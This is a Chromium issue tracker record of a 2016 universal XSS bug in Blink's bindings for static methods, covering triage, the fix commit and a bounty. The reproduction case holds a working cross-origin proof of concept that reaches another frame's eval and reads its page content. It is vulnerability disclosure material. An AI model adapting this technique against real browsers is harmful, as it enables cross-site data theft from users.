# Security: Universal XSS with static methods and ScriptState::forHolderObject

| Field | Value |
|-------|-------|
| **Issue ID** | [40084962](https://issues.chromium.org/issues/40084962) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Bindings |
| **Reporter** | se...@gmail.com |
| **Assignee** | yu...@chromium.org |
| **Created** | 2016-07-29 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

The bindings code for static methods allows |info.Holder()| to be set to an arbitrary value.  

The recently introduced |ScriptState::forHolderObject()| function obtains a ScriptState from  

the creation context of |info.Holder()|. So, a static method calling |forHolderObject()| may  

end up using a cross-origin ScriptState.

**VERSION**  

Google Chrome 54.0.2810.2 (Official Build) dev-m (64-bit)  

Google Chrome 54.0.2811.0 (Official Build) canary (64-bit)

**REPRODUCTION CASE**

<script>
frame = document.documentElement.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/services/";
frame.onload = () => {
promise = webkitRTCPeerConnection.generateCertificate.call(frame.contentWindow, {
name: "RSASSA-PKCS1-v1\_5",
hash: "SHA-256",
modulusLength: 2048,
publicExponent: new Uint8Array([1, 0, 1])
});
promise.\_\_proto\_\_.\_\_proto\_\_.constructor
.getOwnPropertyDescriptor(frame.contentWindow, "eval")
.value("alert(document.body.innerHTML)")
}
</script>

--

I would like to remain anonymous for this report.

## Timeline

### ri...@chromium.org (2016-07-29)

Thanks another great report as always!

Can you take a look at this, yukishiino@?

CCing some other folks I've seen on recent UXSS bugs.

[Monorail components: Blink>Bindings]

### sh...@chromium.org (2016-07-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-30)

This issue is a security regression. If you are not able to fix this quickly, please revert the change that introduced it.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-07-30)

[Empty comment from Monorail migration]

### yu...@chromium.org (2016-08-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-08-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3506b0ab25762c3770512385ce232c6ece7ccf6b

commit 3506b0ab25762c3770512385ce232c6ece7ccf6b
Author: yukishiino <yukishiino@chromium.org>
Date: Mon Aug 01 12:22:38 2016

binding: Uses the current context if attribute/method is static.

https://crrev.com/2049493005 did not care about static attributes /
methods.  This CL takes care of "static".

BUG=632634

Review-Url: https://codereview.chromium.org/2199643003
Cr-Commit-Position: refs/heads/master@{#408945}

[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/core/v8/ScriptState.h
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/templates/attributes.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/templates/methods.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/core/V8TestInterface.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/core/V8TestInterface2.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/core/V8TestInterface3.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/core/V8TestInterfaceConstructor.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/core/V8TestInterfaceGarbageCollected.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/core/V8TestObject.cpp
[modify] https://crrev.com/3506b0ab25762c3770512385ce232c6ece7ccf6b/third_party/WebKit/Source/bindings/tests/results/modules/V8TestInterface5.cpp


### yu...@chromium.org (2016-08-01)

Thanks for catching this issue.  I've landed the fix.

FYI, the issue started happening at M54, so there is no need to merge the fix backward.

### sh...@chromium.org (2016-08-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-24)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-23)

And $7,500 for this!

### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-11-07)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2019-02-16)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-16)

This issue was migrated from crbug.com/chromium/632634?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084962)*
